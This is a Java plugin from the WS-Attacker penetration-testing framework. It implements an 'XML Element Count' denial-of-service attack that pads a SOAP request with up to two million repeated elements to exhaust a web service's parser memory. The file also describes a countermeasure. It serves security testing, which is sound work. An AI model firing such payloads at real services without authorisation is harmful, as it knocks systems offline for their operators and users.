/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import java.util.HashMap;
import java.util.Map;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class XmlElementCount
    extends AbstractDosPlugin
{

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;

    // </editor-fold>
    // Custom Attributes
    private AbstractOptionInteger numberOfElements;

    private OptionSimpleVarchar elementToInsert;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        numberOfElements =
            new OptionLimitedInteger( "Number of elements", 25000,
                                      "The number of elements. E.g. '3' means <X/><X/><X/>", 1, 2000000 );
        elementToInsert =
            new OptionSimpleVarchar( "Element to insert", "<!--X-->",
                                     "The name of the inserted element. This can also be a comment." );
        getPluginOptions().add( numberOfElements );
        getPluginOptions().add( elementToInsert );
    }

    public AbstractOptionInteger getOptionNumberOfElements()
    {
        return numberOfElements;
    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENT;
    }

    public void initData()
    {
        setName( "XML Element Count Attack" );
        setDescription( "<html><p>This attack checks wheter or not a Web service is vulnerable to the \"XML Element Count Attack\"</p>"
            + "<p>A vulnerable server will run out of memory when parsing an XML document "
            + "with a high element count</p>"
            + "<p>The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below "
            + "with the defined number of elements.</p>"
            + "<p>The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message"
            + "All inserted elements have the same name as defined in parameter 8.1. "
            + "All inserted elements are children of the same element</p></html>" );
        setCountermeasures( "In order to counter the attack limit the number of elements in an XML document.\n This can be achived using XML schema validation." );
    }

    @Override
    public void createTamperedRequest()
    {

        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String soapMessageFinal = "";

        // create Payload
        StringBuilder sb = new StringBuilder( "" );
        for ( int i = 1; i < ( numberOfElements.getValue() ); i++ )
        {
            sb.append( elementToInsert.getValue() );
        }

        // put Payload as set within options
        soapMessageFinal =
            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage, sb.toString() );

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );

    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}